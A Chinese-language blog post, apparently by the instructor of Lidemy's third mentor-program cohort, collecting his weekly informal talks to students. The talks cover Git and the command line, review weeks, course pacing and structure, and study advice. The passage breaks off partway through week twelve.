        <content type="html"><![CDATA[<p>在<a href="http://華麗謝幕%EF%BC%9A程式導師實驗計畫第三期成果以及未來走向">程式導師實驗計畫第三期</a>裡面，從第四週開始幾乎每一週的尾聲我都會跟同學講一些話，就這樣一直持續到了第三十五週。第三期結束以後我就想說可以把這些隨意聊也集合起來變成一篇文章。</p><p>目的是什麼？第一個目的是讓對這個計畫有興趣的人可以看到每一週的進展，看到每一週我說的話；第二個目的是我說的話就代表著我這個人的想法，想知道我對學生以及這個計畫抱持的態度，看這些隨意聊是最準確的。</p><p>因此，底下就是我當初在各週隨意聊的內容，可能會經過一些刪減，但想表達的意思基本上不會變。沒有的週數就代表那一週沒有講話。</p><p>原本其實是想把三十五週都放上來，但因為長度會變太長，所以就先放前十三週的了。如果想看後面的週數可以在底下留言敲碗，我再找時間開新的文章，把後面的週數一起放上來。</p><h4 id="第一週"><a href="#第一週" class="headerlink" title="第一週"></a>第一週</h4><p>大家安安，明天就是第一週的最後一天了，最近有些心得跟大家分享一下。</p><p>首先跟大家分享跟作業有關的東西，因為同學都陸陸續續開始交作業了，這邊主要要提醒的點有兩個。</p><p>第一，提交 PR 之後記得要去另一個 repo 開 issue，否則我不會改作業。原因是這期同學真的太多，所以想找一個地方集中讓我比較好改作業，如果像第二期一樣的話會分散各處，我絕對會忘記現在改到哪一份作業，所以第三期才變成這樣。</p><p>第二，作業交了以後如果有一些小錯誤，自己提交 PR 之後自己 merge 就好，不用再交一次。標準很簡單，你希望我改的你就循著正常交作業管道，你覺得不用我看的就自己 merge 就行了。總之有 po issue 的我都會看，沒 po 的就都不會看。</p><p>再來就是作業有時候看太多份會看到頭昏眼花…所以有些地方有錯可能沒有看到，在這邊先跟大家抱歉一下。還有一點想說的跟作業沒什麼關係，跟網路上溝通的文字有關。</p><p>文字能傳達的意思有限，講個小故事，我有一個朋友很喜歡打「嗯哼」，在我的想像中整句會像是：「嗯哼，所以勒？」的那種感覺，有點不屑的意味；可是問他本人之後，他的意思比較像是「嗯」，就只是一個肯定句而已。這也是為什麼我們需要 emoji 跟各種表情符號，才能更完整地表達出語氣。</p><p>總之呢，希望大家看到任何語句的時候都先預設是很平和的語句，舉例來說：「你為什麼要改這個？」不要想像成是你老闆質問你的那種語氣，而是要想像成單純好奇發問的那種語氣。</p><p>再來呢，相信大家在這一週裡面都對這個計畫有了更多的一些體悟，例如說同學之間進度的快慢可能從這一週就開始慢慢彰顯出來，或者是說課程的深度以及需要的時數也能深刻體會到。</p><p>勝不驕敗不餒，第一週如魚得水的同學們，別忘記這只是第一週而已。第一週是整個計畫裡面作業最簡單的一週，因為大多數作業都只是寫寫字而已，沒什麼技術含量，之後的作業只會愈來愈難。前五週跟之後的課程內容比起來都算是比較簡單的課程內容，第五週之後大家就知道了  :)</p><p>第一週還在卡關的同學也不用太難過，其實一週能把 Git 跟 CLI 學完，甚至還會順著 GitHub Flow 交作業就已經很不錯了。我一開始學 Git 也是花滿久時間才終於搞懂 branch 跟 commit 到底在幹嘛。</p><p>而且這才第一週而已，計畫才剛開始第六天，沒必要這麼早就擔心東擔心西，跟著自己的進度走就好了。</p><p>另外，已經有些人發現 Git 除了用 CLI，其實也可以用 GUI 操作，例如說用 SourceTree 或是 TortoiseGit 等等的軟體。我之前也考慮過要不要用這些軟體來教學，有圖像化感覺會比較簡單一點。但後來還是決定堅持教 CLI，原因是我不希望大家太依賴 GUI 介面。CLI 你一定用得到，可是 GUI 卻不一定。</p><p>舉一個其他同學說的例子，你不能只考慮自己電腦上的狀況，假設你今天要連到 Server 或是臨時用別人的電腦修 bug，如果你只會用 GUI，那怎麼辦？再花時間裝軟體嗎？那如果是 Server 完全只能用 Terminal 溝通怎麼辦？你就居居了。</p><p>因此學會用 CLI 是相當重要的，而且 Git 的指令其實也不多，花一點時間就能把基本概念都搞懂，其實也沒什麼必要一定要用 GUI。先確保自己會用指令，再去學介面操作軟體增進效率，這是我覺得比較好的學習路徑。</p><h4 id="第四週"><a href="#第四週" class="headerlink" title="第四週"></a>第四週</h4><p>又到了不定期跟大家說說話的時間了。</p><p>計畫已經開始 28 天了，換句話說，差不多一個月了。點開個人檔案，上面的數字跟日曆可以看到自己學習的軌跡。如果沒有意外的話，你應該會寫了差不多 20 篇進度報告。</p><p>而明天終於要迎來第一次的複習週。再次感謝第二期給我這個 idea 的同學，這個建議真的很好。看看大家的進度，如果沒有複習週的話，這一期就要重蹈上一期的覆轍了。雖然說看進度報告好像會以為大家進度都很前面，但沒有。事實上呢，目前大概只有 30% 的同學完成了第四週的作業，其他人都還在繼續努力著。</p><p>複習週的功用就在此展現了，對於進度落後的同學來說，是個能夠追趕的好機會。對於正在進度上或是超前進度的同學們，也能夠利用這段時間好好整理之前學過的東西，做個筆記或者是去查之前沒時間查的問題、訂正以前的作業等等。</p><p>沒意外的話，之後進度應該還會越拉越大。這很正常，因為前面的東西會影響後面的，課程的編排本來就是如此，你不能期待某一週你會突然跟上去，這有點不切實際。不過這也不表示你完全沒機會，之後進入到前端，搞不好有些東西你有碰過；又或者你可以再靠著第十週的第二次複習週拉一點進度。</p><p>也可以換個角度想：為什麼一定要跟上進度？</p><p>能跟上當然是很好啦，但如果跟不上就跟不上了，也不用太過於擔心。從課程開始前我就跟大家說過了，好好地看著自己就好。如果你是擔心自己沒有寫程式的天份，或者是擔心自己適不適合寫程式，只要先問自己一個問題就好：「在這四週的時間內，你有覺得寫程式好玩嗎？」，如果沒有的話，那可能真的不太適合（也有可能是我教太差啦），如果有的話，就再多嘗試個一兩個月看看。</p><p>今天看到同學寫的一段心得很棒：</p><blockquote><p><em>複習週的小挑戰，有些題目很快就解出來，有些則是總有些考慮不到的條件，看到提交之後出現的 100 分，這就是解出來的成就感。就像排球少年中烏野對白鳥澤的春高前哨戰月島的覺醒：『不過是攔到一球、不過是 25 分中的 1 分，不過就是個社團活動。』對應到梟谷的木兔信誓旦旦的說的：『如果，那個瞬間出現的話，那就是你愛上排球的瞬間。』大概是類似這樣的成就感，才能讓出現無數次 WA 之後的 AC 有著這麼大的魅力</em></p></blockquote><p>在進度方面，大家要考慮到兩件事，第一件事情是同學的程度不同。我們先不談努力，因為你得要知道很多進度在前面的同學差點或曾經是工程師。第二件事情是課程的廣度與深度，對完全新手來說，其實前四週已經塞了很多東西了。</p><p>話說在教學上，前五週也是我自己比較有把握的一週。因為每一期剛開始的時候人一定最多嘛，所以樣本也最多，經歷過兩期之後我也比較知道該怎麼調整。六到十週也還算有把握，但十週以後我就真的不確定了。我有看到滿多同學給予前五週的課程好評，小弟我其實也是誠惶誠恐，因為後面的內容可能沒有前面這麼好。總之之後再看看吧！</p><p>然後我看到有些同學假日會出去玩什麼的，我覺得這很好啊，我們這裡又不是指考衝刺班，要你每一天都來補習班報到，頭上要綁必勝頭巾，早上還要喊：「我要上台大！」。學習的時候就全心學習，玩的時候就全力玩，不然一直卡在中間也是挺累的，而且更容易把毅力給磨掉。</p><p>再說，寫程式的好處就是儘管你不在電腦前，你也還是可以想著怎麼解題。例如說第二三週的作業跟 Lidemy OJ 上面那些題目，你題目看一看有個印象之後，出去玩無聊的時候就可以來想一想該怎麼解決。因為這些不用寫 code 也可以，你只要能用你的大腦想出一個解法，回家的時候再用程式碼來實現就好。</p><p>目前想說的大概就是這樣，祝大家學習愉快！</p><h4 id="第五週"><a href="#第五週" class="headerlink" title="第五週"></a>第五週</h4><p>安安，又是我。</p><p>不知不覺已經在日本待了十天，而第一次複習週也默默地結束，課程要進入到了第六週。</p><p>有人說複習週好像怎麼複習都複習不完，這是正常的。就像你以前準備基測或是學測時也不會有覺得自己準備好的一天一樣。畢竟學無止盡嘛，你不可能每次考試都一百分，所以永遠都會有遺漏的部分。</p><p>第一次的複習週其實也是讓大家自己摸索一下如何複習，我有看了一下大家的複習週心得，有些人跟我一樣，同樣的影片幾乎沒辦法看第二次，因為會覺得都看過了。（相同的電影我也很難再看第二次，復四二刷我看到快睡著，這輩子我唯一進電影院看兩次還是覺得不錯的電影叫做單身動物園）</p><p>若是有人跟我一樣的話，之後可以在上課時就先稍微紀錄一下自己不理解的地方，或者是想要問的問題。這樣累積了四週之後，就可以在下一次的複習週有個明確的目標，知道自己哪邊需要加強。或者，也可以考慮換個方式重寫自己前幾週的作業。舉例來說，以前用 map 這次用 forEach；以前用遞迴這次用迴圈等等。再不然的話，複習週提供的小遊戲也是很適合打發時間的東西。</p><p>總之呢，每個人複習的方式不同，這邊也可以參考其他同學的心得來看看大家都怎麼利用複習週的。</p><p>另外，大家會發現這堂課怎麼到處都要寫心得。每天寫、每週寫、複習週也要寫！這可能跟課程的設計者（就是小弟我）很有關係，畢竟你一定也看得出來我就是個很喜歡寫東西的人，不然也不會有這個不定期跟大家講講話的時間了。除了喜歡寫以外我也很喜歡看，所以看到同學的心得寫超長就會很興奮，留到最後再看，有種拆禮物的感覺。</p><p>不過你心得寫短短的也是可以啦，畢竟也不是每個人都有這麼多心得，所以心得沒有限定字數，我不會強迫你要寫幾個字。對寫不出來的人來說是種痛苦，對寫得出來的人來說反而是種束縛。就自己舒服就好，像我有時候寫個一萬字也覺得挺舒服的。</p><p>在寫心得的時候，也很鼓勵大家 po 到自己的網誌或其他地方去，然而有些同學會有一個疑問，那就是怕說心得 po 出去會洩漏一些課程的資訊，不知道這樣行不行。</p><p>這邊統一跟大家講一次，行，沒什麼不行的。只要你不是把 Lidemy 上的影片全都下載然後上傳到免空，沒什麼不行的。你要截一些影片的圖放在你的網誌我也無所謂。</p><p>對我來說，這整個計畫的價值就在於這是「一個計畫」，是課程影片、改作業、進度報告、心得跟同儕這所有元素綜合之下產生的價值，就好像黑暗大法師你只拿到一條腿跟一條手是沒有用的，你要湊齊五張卡牌才可以。所以你心得洩漏了課程資訊什麼的我也覺得無所謂，反正得到最多幫助的一定還是在這個計畫的同學們。</p><p>所以想寫心得公開就寫，沒什麼不能寫的。不用怕會透露課程資訊或什麼的，因為透露了也沒差。這邊我要公開表揚一個同學的第五週心得，他整理了前四週的課程而且整理得很棒，非常非常推薦大家看著這個檔案也複習一下：<a href="https://github.com/Lidemy/mentor-program-3rd-ClayGao/blob/master/homeworks/week5/hw1.md">https://github.com/Lidemy/mentor-program-3rd-ClayGao/blob/master/homeworks/week5/hw1.md</a></p><p>沒有被我直接公開表揚的也絕對不是不好，只是這個實在太值得拿出來跟大家分享了，因為對所有同學都有幫助。</p><p>然後再跟大家提醒一次，每週自己寫的筆記可以放在這邊跟大家一起分享：<a href="https://hackmd.io/s/SJt3KWk2E">https://hackmd.io/s/SJt3KWk2E</a>。</p><p>好，複習週的東西差不多談完了，接著談談之後的課程。</p><p>再來第六週會是網頁前端 HTML + CSS，有些同學已經有基礎所以應該會比較順利一點，但難度好像還是比我預設的要再高一些。</p><p>第七週是 JavaScript，我們終於要在網頁上來使用 JavaScript，並且用它來操控網頁上的元素，會是很好玩的一週，也可以讓你體驗實際應用 JS。</p><p>第八週是如何利用「網頁上的 JS」與 API 串接。對，這跟你用 Node.js 不一樣。所以 API 串接不熟的大家不用擔心，你第八週會被強迫複習 API 串接。這邊的內容在第二期是放在第四週，所以死一大堆人，這一期才特別把第四週變成先理解 API，然後第八週再練習一次，希望能夠把學習曲線拉低一點。</p><p>第九週要進入到後端，學習 PHP 與 MySQL，也會是個滿好玩的一週。</p><p>無論你有沒有注意到，每週課程的編排背後都是有經過思考的。為什麼不先教 HTML &amp; CSS？為什麼第一週就教 Git？這些都是有原因的。經過了前五週，大家會發現自己對 Git 愈來愈熟悉，因為每週交作業都會用到。對寫程式這件事情也不再陌生，因為第二三四週甚至複習週都在用 Lidemy OJ 寫 JS，來解一些基本的題目。</p><p>在前五週把基礎打穩之後，我認為之後的課程會更容易一些。當你在網頁上寫 JS 的時候，你知道只是換了個地方，有更多瀏覽器提供的東西可以用，也可以操控網頁上的東西。所以你要學的只是這些新東西而已，因為你基本語法都搞定了。</p><p>我覺得我一部分的工作就是要來幫大家持平自信。當有人太過自信時（但好像沒有人這樣，也是件好事），我就會跳出來跟他說：「沒有喔，這很基本，你一點都不強」；當有人太沒自信時，我也會跟他說：「不對喔，你看看你學會了這些，其實已經很不錯了」。以我的觀察來說，大部分同學是處於後者。</p><p>雖然只有五週，但我相信很多人都已經察覺到自己的改變。想想看五週前的自己，Git 是什麼？CLI 又是三小？更別提 JS 無字天書了。但現在的自己每天都用 CLI 卻不覺得有什麼問題，用 Git 交作業更是跟吃飯喝水一樣，JS 雖然只是解一些小問題，但慢慢能夠把自己的想法轉換成程式碼，慢慢地不用再用紙筆寫下來，可以在腦內就自動做完轉換。</p><p>這是程式生涯的一小步，但卻是你自己的一大步。</p><p>想成為工程師本來就不是什麼一蹴可幾的事情，更別提我想讓大家不只成為工程師，還能成為好的工程師。資深工程師之所以資深，部分原因是因為他踩過的坑比新人多，解掉一個 bug，日後你解不開的 bug 就少了一個。你每寫的一行 code，都讓你離成為工程師更近了一步。</p><p>第六週要面臨到全新的挑戰了，一定會卡關，一定會有點崩潰（？），但也一定會很有趣。大家加油。</p><h4 id="第六週"><a href="#第六週" class="headerlink" title="第六週"></a>第六週</h4><p>今天是第六週最後一天，一樣跟大家同步一些事項。</p><p>這邊更新一下課程的一些數據，計畫剛開始是收 63 人但有一個人沒回應，所以學生數其實是 62 人。第四週時淘汰 3 人，第六週時淘汰 1 人，目前剩下 58 人。</p><p>其實淘汰制的部分我沒有真的很仔細去抓，基本上我就是拉進度報告來看，然後會被淘汰的幾乎都是那種兩週內只交兩三篇或甚至沒交進度報告的，那就很明顯是沒有在跟課了。</p><p>再來是目前大家的進度分佈：</p><p>第二週 7%<br>第三週 7%<br>第四週 15%<br>第五週 17%<br>第六週 40%<br>超前進度 14%</p><p>可以看出來大概一半的人跟上進度，另一半沒有。原因可能有很多，有可能是我的問題（課程沒設計好）也有可能是你的（沒有付出一定時間）。不過這邊歸咎問題其實也沒什麼幫助，反正進度是自己的，只要能好好學習下去，落後一點也沒什麼關係。</p><p>今天是計畫的第 42 天，所以大家已經開始學程式一個半月左右了。雖然說系統的字數統計其實不太精準（因為特殊符號跟程式碼都會被列入），但還是稍微跟大家講一下。</p><p>大家一共寫了 63 萬字的進度報告，其中有五位同學寫了超過兩萬字，最多的甚至還寫到五萬字，實在是很會寫。但沒有寫到這麼多的也不用緊張，畢竟進度報告就只是個報告，你想寫多還是寫少都可以，本來就沒有規定字數要多少。像我遊記也是有靈感的時候就多一點，反之則少一點，不用對字數這種東西有壓力。</p><p>第六週的部分其實應該要更多實戰切版的部分才對，不然講了這麼多 CSS 跟 HTML 的東西，實際上看到要切的東西還是會傻住，根本不知道應該如何開始。這邊的話建議大家也可以上網找一些其他的學習資源或是別人切版的影片，應該會對這一塊更熟悉一點。</p><p>下一週會進入到在網頁上使用 JavaScript，下下週會在網頁上串接 API，下下下週會進入到後端 PHP，然後就又到了下一個複習週了。</p><p>學習這種事情就是這樣嘛，有高有低，有時候卡關卡得要死開始懷疑人生，但隔天突然有如神助咻咻咻就把卡住的地方解掉了，頓時覺得超級開心，然後過三秒又開始卡關。</p><p>進度報告的好處就是你可以看到別人跟你一樣在卡關，要死大家一起死（？），心情應該會開闊一些。這邊也很鼓勵同學們互相交流啦，可以去找一樣落後進度的人一起取暖（？），然後一起罵說怎麼課程設計得這麼爛，教切版也不好好教什麼的，搞不好罵一罵就覺得心情好多了然後隔天就開始繼續努力寫作業。</p><p>但當然也會看到有些人怎麼過得那麼順遂，好像作業都輕鬆解決，然後進度領先到不知道哪裡去了。可能他以前學過，或也有可能他真的跟你一樣無基礎但就是對程式這塊特別厲害，天生就程式腦。人生就是這樣嘛，大家的起跑點本來就不一樣，每個人都是獨一無二的。</p><p>一個調適心情的好方法是去看看自己所擁有的，而不是自己沒有的。你可以回去 Week1 看看你寫的 Git 跟 Command line 筆記，會發現兩個月前自己完全不懂，怎麼現在卻可以教別人了。看看 Week2 跟 Week3 的題目，重新再寫一次，發現怎麼跟那時候比起來順那麼多，順順地就可以把程式碼寫出來了。</p><p>你一定會發現自己在落後，但卻很難發現自己從另一個角度看其實已經領先了。</p><p>就祝大家第七週順利啦！</p><h4 id="第七週"><a href="#第七週" class="headerlink" title="第七週"></a>第七週</h4><p>前幾週跟大家講的東西好像都差不多，這一週來講點不一樣的。</p><p>在改作業的時候，常常會看到我說：「大致上都 ok」之類的話，這句話如果要講的完整一點，大概是：「功能測起來我都 ok，基本功能都行。程式碼部分還可以，但不夠好」</p><p>當你交完作業的時候，通常你只是把基本中的基本給完成了。</p><p>但如果你想變得更好，這還不夠，還遠遠不夠。想知道有多不夠，你去看一下其他同學的作業就知道了。</p><p>參考同學的作業是這個課程裡面很重要的一環。之前應該有跟大家說過，我在看作業的時候注重的比較多在於呈現出來的結果，你只要能做的出來，我不太管後面怎麼寫的（除非真的太糟糕）。但對於工程師來說，其實背後的實作才是更重要的部分。因為把功能做出來大家都會，但是要怎麼把程式碼寫得漂亮，就是一件要花十倍的時間才能達成的事情。</p><p>如果我要每一份都非常詳細地去看過，那滿沒有效率的，而且也太花時間。比較好的方法就是你交完作業以後自己去看同學的程式碼，因為你可以從不同人的程式碼上面都學到一點，這些是連我都還難直接給到你的經驗。</p><p>然後通常一週結束以後我會 po 前一週的作業注意事項之類的，基本上就是我改了這麼多份作業之後統整出來的一些心得，就代表有一大堆人會犯這個錯誤，所以我提出來一起講。因為一起提出來講了，所以在改作業的時候我就不會特別再提一次，因為注意事項是你應該注意的東西。</p><p>大概就是這樣，happy coding!</p><h4 id="第八週"><a href="#第八週" class="headerlink" title="第八週"></a>第八週</h4><p>沒想到已經來到第八週的尾聲了，從計畫開始到現在居然快兩個月了。</p><p>如果你是落後進度的那群人，不用擔心，因為有七成的同學跟你一樣。所以你要知道你並不孤單，孤單的反而是有跟上進度的那一群人。</p><p>今天跟大家分享幾個小故事好了，</p><p>以前在工作的時候，我偶爾會陷入倦怠期，這個倦怠指的是我看到新的需求，下意識就會覺得：「這好麻煩喔…好懶得做」。可是畢竟是領人家薪水嘛，再不想做也得做，所以最後還是做了。</p><p>可是當我真的開始下去做的時候，會發現：「咦？好像沒有想像中麻煩」<br>於是就用了比自己想像中還要快的速度把東西做完了。</p><p>這個故事想告訴大家的是，無論東西看起來多麽困難，至少要先去嘗試<br>搞不好嘗試之後發現怎麼那麼簡單（當然也有可能相反），所以踏出第一步是很重要的，你沒有踏出那一步，就不會知道後面有什麼。</p><p>第二個小故事一樣關於工作，那時候從外包那邊接來程式碼，發現靠杯怎麼程式碼亂成這樣，而且一大堆東西亂寫，瞬間覺得頭很痛，實際下去改過一點東西之後也一樣覺得好難改，這樣纏在一起要怎麼去改它？</p><p>但沒辦法，我知道如果現在不改，以後只會愈來愈亂，所以還是利用一些時間一點一點去改它。就這樣改著改著，大概過了兩三個月，發現程式碼已經乾淨很多了，要加新功能也容易許多。</p><p>有些人對寫程式有點誤解，以為吧是一氣呵成的。不是，我跟你寫程式的時候一模一樣，是跌跌撞撞的。這就是為什麼我在教學的時候你通常都可以看到我錯誤的地方（我不否認還有一個原因是因為我懶得剪輯啦…），因為這才是真正在寫程式的樣子。</p><p>你以為你外面看的那些程式教學影片，老師都是直接咻一下就寫出來給你看的嗎？不是，要嘛就是剪輯，要嘛就是程式碼先準備好在旁邊（雙螢幕所以你看不到），要嘛就是老師真的靠杯強。</p><p>寫程式本來就是跌跌撞撞的，先完成一部分，再完成一部分，最後再把它組裝起來；而且也不是寫完就寫完了，也有可能邊寫邊改之前的地方，這些都是再正常不過的事。我寫的比你順是因為我經驗比你多，寫過的程式碼比你多，就像個出過書的作家一樣。所以當我下筆時我大概知道這邊要放什麼句子，要下怎樣的標題，但你沒經驗所以你不知道，所以你寫完之後要再回來想一個吸引人的標題。</p><p>最近無聊沒事時我會看《這就是街舞》，一個跳舞的節目，其中有一些是跳 breaking 的，他們放那些大招放得那麼帥，都是摔了幾百幾千次之後才換來的結果，搞不好還曾經練到手斷掉之類的。強者之所以強，不是因為他們比較厲害，是因為他們受過比較多傷。</p><p>講到跳舞，來提第三個小故事，我在新加坡的時候曾經學過一點 popping（但回台灣之後完全荒廢，現在幾乎忘光了，其實有點可惜），當老師教我一個新動作的時候，做起來超級無敵卡，想說老師怎麼可以做得那麼流暢。</p><p>老師跟我說：「你就一直做就對了」，結果過了兩三個禮拜的偶爾練習之後，還真的把動作練會了，跟原本剛學的時候相差許多，至少順很多。很多事應該都是這樣，像健身、像跳舞，像寫程式，只要一直練一直練就會變強。</p><p>但我提這個小故事，不是要跟你說你要一直努力，我只是想強調「一直練就會變強」這件事。努力是你的選擇，我不會要你一定要努力。但至少不能欺騙自己。你不能說著「我想跑全校第一」卻不練習跑步，要嘛就放棄想跑全校第一這個想法，要嘛就乖乖練習跑步，不能什麼都不做卻還妄想著不勞而獲的成果。</p><p>我想說的是，當你卡關的時候，可以想一下兩三週前的自己。不是之前也卡關了嗎？但還是過來了。我覺得這會是讓自己更有力量的一件事，知道自己曾經辦得到，所以會更相信自己現在也辦得到，「無論怎樣的難關，最後都會跨過，只要你持續前進著」。</p><p>祝大家學習順利，然後我明天要飛紐約了，之後會跟大家有點時差，先跟大家講一下 XD</p><h4 id="第九週"><a href="#第九週" class="headerlink" title="第九週"></a>第九週</h4><p>經過了六十多天的努力之後，終於迎來了第二次的複習週，一樣隨意跟大家聊聊。</p><p>我相信相對於第一次的複習週，這一次的會很不一樣。因為上一次在複習週的時候真的在複習的人不少，但這次複習週可能很多人是拿來趕進度用的。<br>不過複習週其中之一的用途本來就是這樣，空一週完全沒進度，讓大家自由調配。</p><p>先來幫大家叮嚀一下這次複習範圍（第六到第九週）的重點好了，前五週我們有了一些程式跟網路的基礎，至少你知道怎麼發 request 怎麼收 response，你也知道怎麼寫基本的程式。</p><p>第六週學了 HTML+CSS，前端頁面的排版，雖然說對有些人來說有點趕，但仔細想想也是正常，因為你要知道，你看到的所有網頁，對，所有（好啦應該沒有所有，大概八九成）就是用這些 CSS 屬性刻出來的。</p><p>Facebook 也好 GitHub 也好，你右鍵檢查元素，一樣是你熟悉的那些 padding margin display，所有複雜的東西，都是由這些再基本不過的屬性組合而成。在第六週你只要稍微熟悉一下就好，因為之後還有很多機會讓你切版，就算你不想練習，作業也會推著你繼續向前走。</p><p>第七週我們把 JS 給搬上瀏覽器，並且說明了 JS 對於瀏覽器的重要性：操控畫面，這是你唯一可以操控瀏覽器畫面的方法：透過 JS。前五週大家有了程式基礎，在這周要補的是瀏覽器跟 JS 怎麼互動，基本上就是透過 selector 選到特定元素，然後 addEventListener 加上事件互動，最後寫一下程式邏輯並改變畫面。</p><p>就這樣，就是全部了。</p><p>你只要知道怎麼選到元素、怎麼加事件然後怎麼改變畫面，就幾乎可以做出所有你看得到的網頁（但當然會比較複雜啦）。</p><p>第八週延續第四週跟第七週的內容，現在變成要在瀏覽器上面發送 request 去拿資料。重點有兩個，第一個是瀏覽器因為安全性會有一些限制，你必須知道有哪些限制以及如何突破，第二個重點是學會在瀏覽器上面發 request 以後，最後一塊拼圖就補齊了，這次你真的可以做出所有你看得到的網頁。</p><p>隨便舉個例子，臉書訊息的對話視窗：幫 input 加上按下 enter 鍵的 event listener，當按下 enter 鍵的時候，ajax 發送資料到訊息相關 api，等 response 確定成功之後，選到對話框然後 append 一筆訊息，打完收工。</p><p>第九週進入到一個新的領域：後端。有兩個重點，PHP 跟資料庫，資料庫就只是個儲存資料的地方，你可以寫 code 把資料拿出來，就只是個用 code 操作的 excel 而已。</p><p>PHP 呢？會選 PHP 就是因為夠簡單，他就只是一個後端的程式，你在 PHP 裡面 echo 什麼，response 就長什麼樣子，就是這樣子而已。如果放到 JS 來講，大概就是你在 JS console.log 什麼東西，你的 response 就是什麼，所以你在  .php 檔可以寫 html，可以寫 CSS 也可以寫 JS，因為最後都會變成 response 的一部分，跟你直接寫 html 相去無幾。唯一的差別是你可以「動態」產生出內容，若是你不理解後端跟前端的差異以及整個運行流程，之後一定會碰到一大堆問題。</p><p>前九週學完以後，其實只要發揮一點想像力，你就可以做出任何你想做的東西。</p><p>Facebook？可以啊，不就是比較複雜的留言板嗎？<br>GitHub？可以啊，不就是留言板的內容變成 code 嗎？<br>Google？可以啊，不就是去資料庫搜尋關鍵字嗎？</p><p>當然，我這邊指的做出任何東西指的是陽春版的，真正要變成那種規模還需要懂一大堆東西。但我只是想表示，前九週的內容把前後端基礎講得差不多了，你已經具備做出一個很陽春的產品的能力，剩下的就是你怎麼把小的東西組裝成大的。</p><p>之後的十一二週會延續後端，繼續加強後端與資訊安全相關的能力，十三週跳回來學一些前端的函式庫，十四週把後端程式部署上去，接著就又到了下一個複習週。</p><p>最後來簡單談一下拖延症，看到滿多同學在進度報告說自己開始漸漸拖延，或者是慢慢不想寫作業。啊這很正常啦，本來就很容易會這樣，我自己也拖延症啊，沒拖延症的話每一週一定都會有更詳細的影片教學，搞不好還搭配文字內容輔助。</p><p>二十週以後的課程也因為拖延症所以還沒有開始動工，我也希望我近期能夠稍微克服一下拖延症…大家共勉之。</p><p>happy coding!</p><h4 id="第十一週"><a href="#第十一週" class="headerlink" title="第十一週"></a>第十一週</h4><p>第十一週開始了，所以理所當然的，又到了我隨意講些話的時候，先給大家看一下目前進度比例：</p><p>第六週（含）以前：20%<br>第七週：22%<br>第八週：16%<br>第九週：14%<br>第十週（含）以後：28%</p><p>這樣看起來應該是以第八週為分界點，一半的人在這之前，一半的人在這之後，現在是第十一週的開頭，所以進度平均是落後兩三週左右。</p><p>然後目前平均大約每兩週會淘汰兩個人，學生人數從 62 來到了 54 人，但有些同學消失了你應該也察覺不到，因為被淘汰的本來就是不常出現才會被淘汰 XD</p><p>接著跟大家講一下從第九週一直到第十四週的課程設計，之前應該跟大家提過，這要從課程演變的角度去想。</p><p>第一期直播上課，而第二期讓大家去看第一期，順便補充第一期沒講清楚的地方，後來發現後端這塊還是講不清楚，於是有了 BE101 這堂課程；可是我又發現 BE101 好像對於整個大架構講得沒那麼清楚，沒有第一期那麼清楚<br>而這就是為什麼後端這幾週的指定教材會這麼多。</p><p>其實很多影片內容都有重疊，但沒重疊的部分又是我覺得重要的，所以才會都列在一起，我想說也可以讓大家當做複習（？）</p><p>第九週我有更新上去同學推薦的順序，十一週以後的順序我這兩天有時間應該會再看一下，會把順序講得更詳細。這樣大家也比較知道每個影片到底有哪些內容。</p><p>然後九到十四週除了十三週塞了一個前端，其他都是後端的內容，內容是循序漸進的，每週的內容都跟上一週有關，你會不斷加強留言板。所以寫作業的時候如果你覺得這樣怪怪的、這樣做會有問題，沒錯，你是對的，因為我是故意的，你的疑惑在下週或是下下週很有可能就會被解答。</p><p>在學習的量上面因為這幾週是連續的主題，所以我自己設計的時候是估說應該 ok，至少比新學一個東西需要的時間要少，希望我是對的，不然大家進度又要再落後了 XDD</p><p>還有，每五週一次的複習週都會要大家寫一下這幾週的心得，每個月回憶一次其實不一定記得起來，所以建議大家平時就可以先整理了，學習的時候有什麼心得感想都可以先寫起來，之後交的時候就比較方便。</p><p>happy coding!</p><h4 id="第十二週"><a href="#第十二週" class="headerlink" title="第十二週"></a>第十二週</h4><p>給大家幾個可以讓課程比較順利進行的小撇步，但是僅供參考，如果底下這些點你真的很 care，照著你自己的步調走其實也 ok。</p><p>第一個，別碰挑戰題。</p><p>沒記錯的話我之前應該有講過挑戰題的由來，會有挑戰題是因為(1)有工程師(2)有強者同學超前進度，為了怕這兩者無聊，所以放入一些挑戰題，避免他們進度太快不知道要幹嘛。</p><p>所以，如果你是個剛接觸程式沒多久的人甚至是完全新手，可以直接略過挑戰題，因為那本來就不是給你做的。</p><p>我其實對學生的標準只有做完作業就好，不包含挑戰題，畢竟大家都知道，光是做完作業就要花一段時間了，何況是難上不少的挑戰題 XD</p><p>不過如果你很想挑戰自我，我也是不反對啦，只是你可能會需要在那週多停留好一陣子。</p><p>第二個，拋棄你的完美主義</p><p>很多人都會想把作業做得很完美，或者換句話說，弄的很漂亮。</p><p>以前端工程師來說，我覺得分成兩個走向，一個偏視覺一個偏功能，像吳哲宇那種就是偏視覺的，我個人則是偏向功能的，或者更精確來說是偏向工程，而這堂課程的作業也是以功能為主，所以在第九週第十一週，才會看到我 live coding 寫出來的留言板這麼醜，因為我不在乎美觀程度，只在乎功能是不是有寫出來。</p><p>為什麼呢？因為去工作之後會有設計師幫你搞定，輪不到你來決定。就算沒有設計師，大家一定也都是找現成的 UI 框架之類的，都已經幫你做得美美的，你只要照著用就好</p><p>我看到有滿多人糾結於畫面要美觀所以卡了很久，但這邊我其實會建議大家只要功能完成就好，美觀的部分就再說。不過之後如果要把這東西放上作品集，美觀程度的確是會有差啦，但可以靠 bootstrap 之類的 UI 框架來補足這部分，或是跟我一樣很沒有美感的人可以直接照抄同學的 UI（？）</p><p>畫面醜歸醜，但只要功能做的出來，就是個合格的工程師，因為這邊不是設計師養成班，是工程師。</p><p>第三個，克制住求知的衝動</p><p>我知道滿多人查到某個東西很好奇，就會一路查下去，把祖宗十八代在幹嘛全部查出來，然後一天就這樣過去了，留下毫無動靜的作業。</p><p>這是好事也是壞事。當然，你很有求知慾，這個值得鼓勵而且是好的特質，但如果學習的太發散，就會變成什麼都學不到。</p><p>這就好像以前我有一陣子很喜歡看一些科技類的心得文，例如說什麼 Netflix 